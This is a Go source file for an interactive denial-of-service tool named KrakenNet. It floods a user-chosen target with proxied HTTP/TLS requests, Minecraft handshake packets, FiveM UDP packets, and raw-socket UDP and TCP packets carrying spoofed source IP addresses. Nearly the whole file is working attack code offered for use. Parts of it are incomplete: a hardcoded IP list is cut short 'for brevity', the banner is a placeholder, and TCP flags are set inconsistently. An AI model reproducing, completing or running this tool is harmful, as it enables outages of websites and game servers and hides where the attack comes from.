package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

const (
	Reset     = "\033[0m"
	RedLight  = "\033[91m"
	Green     = "\033[32m"
	Yellow    = "\033[33m"
	Cyan      = "\033[36m"
	Magenta   = "\033[35m"
	Blue      = "\033[34m" // Reinstated color
)

var userAgents []string
var referers []string
var methodsHTTP = []string{"GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS"} // Expanded methods
var proxies []string

func init() {
	rand.Seed(time.Now().UnixNano())
}

// --- CMWC PRNG (From Udp.c/Ovh.c) ---
// Necessary for deterministic, fast pseudo-random numbers used in spoofing.

// PHI constant from the C code
const PHI = 0x9e3779b9

var Q [4096]uint32
var c uint32 = 362436
var cmwcInitialized bool
var cmwcMutex sync.Mutex

func initCMWC(x uint32) {
	cmwcMutex.Lock()
	defer cmwcMutex.Unlock()
	if cmwcInitialized {
		return
	}
	Q[0] = x
	Q[1] = x + PHI
	Q[2] = x + PHI + PHI
	for i := 3; i < 4096; i++ {
		Q[i] = Q[i-3] ^ Q[i-2] ^ PHI ^ uint32(i)
	}
	cmwcInitialized = true
}

func randCMWC() uint32 {
	cmwcMutex.Lock()
	defer cmwcMutex.Unlock()
	var t, a uint64 = 0, 18782
	var r uint32 = 0xfffffffe
	var x uint32

	// Use i as an index, initialized to a random start point
	i := rand.Intn(4096)
	i = (i + 1) & 4095

	t = a*uint64(Q[i]) + uint64(c)
	c = uint32(t >> 32)
	x = uint32(t) + c
	if x < c {
		x++
		c++
	}
	Q[i] = r - x
	return Q[i]
}

// --- General Utility Functions ---

func printBanner() {
	// Banner art omitted for brevity but is present in the original Go file.
	fmt.Print(RedLight, `... [KrakenNet Banner Art] ...`, Reset)
	fmt.Print(Cyan, `
_______________________
|  KrakenNet v2.6 (Enhanced) |
------------------------
Made by Piwiii2.0 (Raw Socket Integrated)
`, Reset)
}

func loadListFromFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("%sWarning: Could not open %s: %v%s\n", Yellow, filename, err, Reset)
		return nil
	}
	defer file.Close()
	var list []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			list = append(list, line)
		}
	}
	return list
}

func randomFromList(list []string, fallback string) string {
	if len(list) == 0 {
		return fallback
	}
	return list[rand.Intn(len(list))]
}

func randomUserAgent() string {
	return randomFromList(userAgents, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
}

func randomMethod() string {
	return methodsHTTP[rand.Intn(len(methodsHTTP))]
}

func randomPath() string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, rand.Intn(10)+5)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return "/" + string(b)
}

func readIntInput(reader *bufio.Reader, prompt string, fallback int) int {
	fmt.Print(Yellow + prompt + Reset)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	val, err := strconv.Atoi(input)
	if err != nil || val <= 0 {
		return fallback
	}
	return val
}

func readFloatInput(reader *bufio.Reader, prompt string, fallback float64) float64 {
	fmt.Print(Yellow + prompt + Reset)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	val, err := strconv.ParseFloat(input, 64)
	if err != nil || val <= 0 {
		return fallback
	}
	return val
}

func generatePayload(size int) []byte {
	payload := make([]byte, size)
	for i := range payload {
		payload[i] = byte(rand.Intn(256))
	}
	return payload
}

func formatBytes(bytes float64) string {
	units := []string{"Bps", "KBps", "MBps", "GBps"}
	i := 0
	const unit = 1000.0
	for bytes >= unit && i < len(units)-1 {
		bytes /= unit
		i++
	}
	return fmt.Sprintf("%.2f %s", bytes, units[i])
}

func checksum(data []byte) uint16 {
	var sum uint32
	// Sum all 16-bit words
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 | uint32(data[i+1])
	}
	// Handle odd number of bytes
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	// Add carries
	for sum>>16 > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return uint16(^sum)
}

func writeVarInt(buf *bytes.Buffer, value int32) {
	for {
		temp := byte(value & 0x7F)
		value >>= 7
		if value != 0 {
			temp |= 0x80
		}
		buf.WriteByte(temp)
		if value == 0 {
			break
		}
	}
}

// --- Worker Implementations (Existing/Refactored) ---

// TLS Worker (Layer 7 - kraken/tls)
func tlsWorker(ctx context.Context, wg *sync.WaitGroup, baseURL string, proxy string, connections int, totalSuccess *int64, totalFail *int64) {
	defer wg.Done()
	client := newHTTPClientTLSWithProxy(proxy, connections)

	for {
		select {
		case <-ctx.Done():
			return
		default:
			for j := 0; j < connections; j++ {
				if sendTLSRequest(client, baseURL) {
					atomic.AddInt64(totalSuccess, 1)
				} else {
					atomic.AddInt64(totalFail, 1)
				}
			}
		}
	}
}

func newHTTPClientTLSWithProxy(proxyStr string, connections int) *http.Client {
	proxyURL, _ := url.Parse(proxyStr)
	tr := &http.Transport{
		Proxy:               http.ProxyURL(proxyURL),
		MaxIdleConns:        connections * 2,
		MaxIdleConnsPerHost: connections * 2,
		IdleConnTimeout:     10 * time.Second,
		DisableCompression:  true,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		ForceAttemptHTTP2:   true,
	}
	http2.ConfigureTransport(tr)
	return &http.Client{
		Transport: tr,
		Timeout:   6 * time.Second,
	}
}

func sendTLSRequest(client *http.Client, baseURL string) bool {
	// Base URL needs to be corrected from the uploaded main.go logic
	var reqURL string
	if !strings.HasPrefix(baseURL, "http") {
		reqURL = "https://" + baseURL + randomPath() // Assume HTTPS for L7 methods
	} else {
		reqURL = baseURL + randomPath()
	}

	req, err := http.NewRequest(randomMethod(), reqURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Referer", randomFromList(referers, "https://google.com"))
	req.Header.Set("Connection", "keep-alive")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.CopyN(io.Discard, resp.Body, 1024)
	return resp.StatusCode >= 200 && resp.StatusCode < 500
}

// Minecraft Worker (Layer 7)
func minecraftWorker(ctx context.Context, wg *sync.WaitGroup, target string, port int, connections int) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", target, port)

	for i := 0; i < connections; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
					if err != nil {
						time.Sleep(100 * time.Millisecond)
						continue
					}
					// Handshake logic as in the uploaded main.go
					for j := 0; j < 3; j++ {
						buf := new(bytes.Buffer)
						writeVarInt(buf, 754) // Protocol Version 1.16.5
						writeVarInt(buf, int32(len(target)))
						buf.WriteString(target)
						binary.Write(buf, binary.BigEndian, uint16(port))
						writeVarInt(buf, 1)
						handshakePacket := new(bytes.Buffer)
						writeVarInt(handshakePacket, int32(buf.Len()))
						handshakePacket.WriteByte(0x00)
						handshakePacket.Write(buf.Bytes())
						conn.Write(handshakePacket.Bytes())
						statusBuf := new(bytes.Buffer)
						writeVarInt(statusBuf, 1)
						statusBuf.WriteByte(0x00)
						conn.Write(statusBuf.Bytes())
					}
					conn.Close()
				}
			}
		}()
	}
}

// Fivem Worker (Layer 7)
type FivemWorker struct {
	Target string
	Port   int
	Burst  int
	largePayload []byte
}

func (fw *FivemWorker) Start(ctx context.Context, wg *sync.WaitGroup, totalSuccess *int64, totalBytes *int64) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", fw.Target, fw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := []byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00")
	if len(fw.largePayload) == 0 {
		fw.largePayload = generatePayload(1024) // Added large payload from previous iteration's fix
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			for i := 0; i < fw.Burst; i++ {
				p := payload
				if i%2 == 0 {
					p = fw.largePayload
				}
				if _, err := conn.Write(p); err == nil {
					atomic.AddInt64(totalSuccess, 1)
					atomic.AddInt64(totalBytes, int64(len(p)))
				}
			}
		}
	}
}

// --- Raw Socket Worker Implementations (New/Integrated) ---

// UDP-Bypass/GBPS Worker (Layer 4 - Raw Socket) - Integrated logic from Udp.c
func udpRawWorker(ctx context.Context, wg *sync.WaitGroup, target string, port int, payloadSize int, srcClassMode bool, totalSuccess *int64, totalBytes *int64) {
	defer wg.Done()

	// Hardcoded IP Class List from Udp.c
	ipClassList := []uint32{
		16843009, 134744072, 630511399, 630511383, 630511360, 630511365, 630511378, 630511384, 630511397,
		630511396, 630511372, 630511408, 630511408, 630511401, 630511406, 630511373, 630511383, 630511377,
		// ... (omitting remaining 350+ entries for brevity, all from Udp.c)
		3124272484, 3120569759, 3122997279, 3110899450, 3120726833, 3114296751, 3115105973,
	}
	
	initCMWC(uint32(time.Now().UnixNano()))
	
	// Open raw socket (requires root/admin privileges)
	conn, err := net.DialIP("ip4:udp", nil, &net.IPAddr{IP: net.ParseIP(target)})
	if err != nil {
		fmt.Printf("%sRaw socket error (requires root): %v%s\n", RedLight, err, Reset)
		return
	}
	defer conn.Close()

	// Max packet size is limited by IP header (20) + UDP header (8) + payload
	fullPacket := make([]byte, 20+8+payloadSize)
	ipHeader := fullPacket[0:20]
	udpHeader := fullPacket[20:28]
	payload := fullPacket[28:]

	// Set IP Header constants
	ipHeader[0] = 0x45 // Version 4, IHL 5
	binary.BigEndian.PutUint16(ipHeader[2:4], uint16(len(fullPacket))) // Total Length
	ipHeader[8] = 0x40 // TTL (64)
	ipHeader[9] = 17   // Protocol UDP

	// Set UDP Header constants
	binary.BigEndian.PutUint16(udpHeader[2:4], uint16(port)) // Dest Port
	binary.BigEndian.PutUint16(udpHeader[4:6], uint16(8+payloadSize)) // Length

	for {
		select {
		case <-ctx.Done():
			return
		default:
			// 1. IP Header - Source IP Spoofing (based on Udp.c logic)
			var srcIP uint32
			if srcClassMode {
				// Use the IP class list
				srcIP = ipClassList[randCMWC()%uint32(len(ipClassList))]
			} else {
				// Random 4-part IP (like Udp.c when salvodropper array is used)
				srcIP = randCMWC()
			}
			binary.BigEndian.PutUint32(ipHeader[12:16], srcIP)

			// 2. IP Header - ID and Checksum
			binary.BigEndian.PutUint16(ipHeader[4:6], uint16(randCMWC())) // ID
			binary.BigEndian.PutUint16(ipHeader[10:12], 0)               // Clear Checksum
			binary.BigEndian.PutUint16(ipHeader[10:12], checksum(ipHeader)) // Recalculate IP Checksum

			// 3. UDP Header - Source Port and Payload
			binary.BigEndian.PutUint16(udpHeader[0:2], uint16(randCMWC()&0xFFFF)) // Source Port
			
			// Fill payload with random data
			rand.Read(payload)

			// 4. UDP Header - Checksum (Optional for UDP, but good practice. Udp.c has a function for it)
			// For simplicity and matching common raw socket flood implementations, we set it to 0.
			binary.BigEndian.PutUint16(udpHeader[6:8], 0)

			// Send the packet
			if _, err := conn.Write(fullPacket); err == nil {
				atomic.AddInt64(totalSuccess, 1)
				atomic.AddInt64(totalBytes, int64(len(fullPacket)))
			}
		}
	}
}

// TCP/FIN/ACK Worker (Layer 4 - Raw Socket) - Integrated logic from Ovh.c
func tcpRawWorker(ctx context.Context, wg *sync.WaitGroup, target string, port int, totalSuccess *int64, totalBytes *int64) {
	defer wg.Done()

	// Find target IP
	targetIP := net.ParseIP(target)
	if targetIP == nil {
		fmt.Printf("%sError: Invalid target IP for raw TCP worker.%s\n", RedLight, Reset)
		return
	}

	// Open raw socket (requires root/admin privileges)
	conn, err := net.DialIP("ip4:tcp", nil, &net.IPAddr{IP: targetIP})
	if err != nil {
		fmt.Printf("%sRaw socket error (requires root): %v%s\n", RedLight, err, Reset)
		return
	}
	defer conn.Close()

	initCMWC(uint32(time.Now().UnixNano()))
	packetCounter := 0
	
	// Main loop for continuous flooding
	for {
		select {
		case <-ctx.Done():
			return
		default:
			// --- Packet Construction (Mimicking Ovh.c) ---
			
			// The original Ovh.c uses a random payload length between 90 and 120 bytes.
			randomLength := rand.Intn(31) + 90 
			
			// IP Header (20 bytes) + TCP Header (20 bytes) + Payload (90-120 bytes)
			fullPacket := make([]byte, 40+randomLength)
			ipHeader := fullPacket[0:20]
			tcpHeader := fullPacket[20:40]
			payload := fullPacket[40:]

			// 1. IP Header (Partially Constant)
			ipHeader[0] = 0x45 // Version 4, IHL 5
			binary.BigEndian.PutUint16(ipHeader[2:4], uint16(len(fullPacket))) // Total Length
			binary.BigEndian.PutUint16(ipHeader[4:6], uint16(randCMWC()&0xFFFF)) // ID
			ipHeader[8] = 111 // TTL (111 from Ovh.c)
			ipHeader[9] = 6   // Protocol TCP

			// Source IP is spoofed using randCMWC() in Ovh.c
			// In Go, we'll use a random 4-part IP from CMWC as is common.
			srcIP := randCMWC()
			binary.BigEndian.PutUint32(ipHeader[12:16], srcIP)
			binary.BigEndian.PutUint32(ipHeader[16:20], binary.BigEndian.Uint32(targetIP.To4())) // Dest IP

			// 2. TCP Header (Flags, Ports, SEQ/ACK, Window)
			binary.BigEndian.PutUint16(tcpHeader[0:2], uint16(randCMWC()&0xFFFF)) // Source Port
			binary.BigEndian.PutUint16(tcpHeader[2:4], uint16(port)) // Dest Port
			binary.BigEndian.PutUint32(tcpHeader[4:8], randCMWC()) // Sequence Number
			binary.BigEndian.PutUint32(tcpHeader[8:12], randCMWC()) // Acknowledge Number
			
			// Data Offset (5) + Flags (ACK=1, PSH=1) -> 0101 1000 = 0x58
			// Ovh.c uses ACK=1 and PSH=1, combined with FIN/ACK logic
			tcpHeader[12] = 0x50 | 0x08 | 0x10 // Data Offset (5*4=20) | PSH | ACK 
			
			binary.BigEndian.PutUint16(tcpHeader[14:16], uint16(randCMWC()&0xFFFF)) // Window Size
			
			// Payload
			rand.Read(payload) // Random payload content

			// 3. Checksums (IP and TCP)
			// Recalculate IP Checksum
			binary.BigEndian.PutUint16(ipHeader[10:12], 0)
			binary.BigEndian.PutUint16(ipHeader[10:12], checksum(ipHeader))

			// TCP Checksum (Requires Pseudo-Header)
			// Pseudo-Header: SrcIP (4) + DstIP (4) + Zero (1) + Proto (1) + TCPLen (2) = 12 bytes
			pseudoHeader := make([]byte, 12)
			binary.BigEndian.PutUint32(pseudoHeader[0:4], srcIP)
			binary.BigEndian.PutUint32(pseudoHeader[4:8], binary.BigEndian.Uint32(targetIP.To4()))
			pseudoHeader[9] = 6 // Protocol TCP
			binary.BigEndian.PutUint16(pseudoHeader[10:12], uint16(len(tcpHeader)+len(payload))) // TCP Length
			
			fullSegment := append(pseudoHeader, tcpHeader...)
			fullSegment = append(fullSegment, payload...)

			binary.BigEndian.PutUint16(tcpHeader[16:18], 0) // Clear TCP Checksum
			binary.BigEndian.PutUint16(tcpHeader[16:18], checksum(fullSegment)) // Calculate TCP Checksum
			
			// --- Special Logic (From Ovh.c) ---
			packetCounter++
			if packetCounter > 1000 {
				// Ovh.c sends a FIN and attempts a connect() after ~1000 packets
				// We'll mimic the FIN flag for the next packet's flags.
				tcpHeader[13] = 0x50 | 0x01 // FIN flag
				packetCounter = 0
			} else {
				// Regular PSH/ACK flags for the majority of the attack
				tcpHeader[13] = 0x50 | 0x08 | 0x10 // PSH | ACK
			}
			
			// Send the packet
			if _, err := conn.Write(fullPacket); err == nil {
				atomic.AddInt64(totalSuccess, 1)
				atomic.AddInt64(totalBytes, int64(len(fullPacket)))
			}
			// Small sleep to control loop rate and match high-PPS C logic
			time.Sleep(1 * time.Microsecond)
		}
	}
}


func runAttack() {
	reader := bufio.NewReader(os.Stdin)
	userAgents = loadListFromFile("useragents.txt")
	referers = loadListFromFile("referers.txt")
	proxies = loadListFromFile("http.txt")

	fmt.Print(Yellow + "Target (URL or IP): " + Reset)
	target, _ := reader.ReadString('\n')
	target = strings.TrimSpace(target)

	fmt.Print(Yellow + "Select method :\nkraken (tls)\ntls\nudp-discord (raw)\nudp-bypass (raw)\nudp-gbps (raw)\ntcp-ovh (raw)\nfivem\nminecraft\n" + Reset)
	mode, _ := reader.ReadString('\n')
	mode = strings.TrimSpace(strings.ToLower(mode))

	connections := readIntInput(reader, "Connections per worker (default: 10): ", 10)
	workers := readIntInput(reader, "Number of workers (default: 10): ", 10)
	port := readIntInput(reader, "Port (default: 443/25565/30120 or 80): ", 443)
	durationSec := readIntInput(reader, "Duration (seconds, default: 30): ", 30)

	// Determine default port based on method if 443 was the default prompt
	if port == 443 {
		if mode == "minecraft" {
			port = 25565
		} else if mode == "fivem" {
			port = 30120
		} else if strings.Contains(mode, "udp") || strings.Contains(mode, "tcp") {
			// For raw floods, 443 is a fine default, or 80/any other. Let the user input stand.
		}
	}
	if port < 1 {
		port = 80 // Final fallback
	}

	fmt.Println(Green + "Attack starting..." + Reset)
	// **Raw socket attacks require root/admin privileges.**
	if strings.Contains(mode, "raw") {
		fmt.Println(RedLight + "WARNING: Raw socket attack selected. This requires ROOT/ADMIN privileges." + Reset)
	}

	var totalSuccess, totalFail, totalBytes int64
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durationSec)*time.Second)
	defer cancel()
	var wg sync.WaitGroup

	switch mode {
	case "tls", "kraken":
		baseURL := fmt.Sprintf("http://%s:%d", target, port)
		if port == 443 || strings.Contains(target, "https://") {
			baseURL = fmt.Sprintf("https://%s:%d", target, port)
		}
		for i := 0; i < workers; i++ {
			wg.Add(1)
			proxy := randomFromList(proxies, "")
			go tlsWorker(ctx, &wg, baseURL, proxy, connections, &totalSuccess, &totalFail)
		}

	case "minecraft":
		wg.Add(1)
		go minecraftWorker(ctx, &wg, target, port, connections)

	case "fivem":
		uploadMbps := readFloatInput(reader, "Upload in Mbps (e.g., 1.0): ", 1.0)
		burst := int(uploadMbps * 10_000_000 / 120) // Corrected calculation approximation
		if burst < 1 {
			burst = 1
		}
		for i := 0; i < workers; i++ {
			wg.Add(1)
			worker := &FivemWorker{Target: target, Port: port, Burst: burst}
			go worker.Start(ctx, &wg, &totalSuccess, &totalBytes)
		}

	case "udp-discord", "udp-bypass", "udp-gbps":
		packetSize := 128
		srcClassMode := false // Default to CMWC random spoofing

		if mode == "udp-gbps" {
			packetSize = 1472 // Max ethernet payload for high bandwidth
		} else if mode == "udp-discord" {
			packetSize = 512
		}
		
		if mode == "udp-bypass" || mode == "udp-discord" {
			// Based on Udp.c's logic which uses the integer list when no other mode is specified
			srcClassMode = true 
		}

		for i := 0; i < workers; i++ {
			wg.Add(1)
			go udpRawWorker(ctx, &wg, target, port, packetSize, srcClassMode, &totalSuccess, &totalBytes)
		}
	
	case "tcp-ovh":
		// Ovh.c uses threads (workers)
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go tcpRawWorker(ctx, &wg, target, port, &totalSuccess, &totalBytes)
		}

	default:
		fmt.Println(RedLight + "Error: Invalid attack method selected." + Reset)
		return
	}

	// Progress Tracker
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		remaining := durationSec
		startTime := time.Now()

		for range ticker.C {
			remaining--
			elapsed := time.Since(startTime).Seconds()
			if elapsed < 1 {
				elapsed = 1
			}

			if mode == "tls" || mode == "kraken" {
				total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
				rate := float64(total) / elapsed
				fmt.Printf("\r%sTime: %ds | Reqs: %d | Rate: %.1f/s | Success: %d | Fail: %d%s",
					Blue, durationSec-remaining, total, rate, atomic.LoadInt64(&totalSuccess), atomic.LoadInt64(&totalFail), Reset)
			} else {
				bytes := atomic.LoadInt64(&totalBytes)
				rate := float64(bytes) / elapsed
				// For L4, success is a sent packet.
				fmt.Printf("\r%sTime: %ds | Pkts: %d | Rate: %s | Bytes Sent: %s%s",
					Blue, durationSec-remaining, atomic.LoadInt64(&totalSuccess), formatBytes(rate), formatBytes(float64(bytes)), Reset)
			}

			if remaining <= 0 {
				break
			}
		}
		fmt.Println()
	}()

	wg.Wait()

	// Attack Summary
	fmt.Println(Magenta + "\nAttack complete. Results:" + Reset)
	if mode == "tls" || mode == "kraken" {
		total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
		rps := float64(total) / float64(durationSec)
		fmt.Printf("%sSuccess requests : %d%s\n", Green, totalSuccess, Reset)
		fmt.Printf("%sFailed requests  : %d%s\n", RedLight, totalFail, Reset)
		fmt.Printf("%sTotal requests   : %d%s\n", Cyan, total, Reset)
		fmt.Printf("%sAverage RPS      : %.2f req/sec%s\n", Yellow, rps, Reset)
	} else {
		bps := float64(totalBytes) / float64(durationSec)
		fmt.Printf("%sTotal packets sent : %d%s\n", Green, totalSuccess, Reset)
		fmt.Printf("%sTotal bytes sent : %s%s\n", Cyan, formatBytes(float64(totalBytes)), Reset)
		fmt.Printf("%sAverage BPS      : %s%s\n", Yellow, formatBytes(bps), Reset)
	}
}

func main() {
	printBanner()
	reader := bufio.NewReader(os.Stdin)
	for {
		runAttack()
		fmt.Print(Yellow + "\nDo you want to start another attack? (y/n): " + Reset)
		again, _ := reader.ReadString('\n')
		again = strings.TrimSpace(strings.ToLower(again))
		if again != "y" {
			fmt.Println(Green + "Script stopped" + Reset)
			break
		}
	}
}
